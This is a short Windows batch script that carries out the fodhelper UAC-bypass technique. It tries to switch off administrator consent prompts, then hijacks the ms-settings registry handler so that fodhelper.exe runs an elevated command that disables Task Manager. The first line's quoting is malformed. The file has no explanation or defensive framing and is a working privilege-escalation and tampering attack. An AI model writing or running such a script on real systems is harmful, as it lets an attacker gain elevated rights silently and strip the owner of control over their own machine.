@echo off
REG ADD' HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" 
REG ADD "HKCU\SOFTWARE\Classes\ms-settings\shell\open\command" /t REG_SZ /d "C:\windows\system32\cmd.exe /c REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f" /f
REG ADD "hkcu\software\classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d " " /f
fodhelper.exe
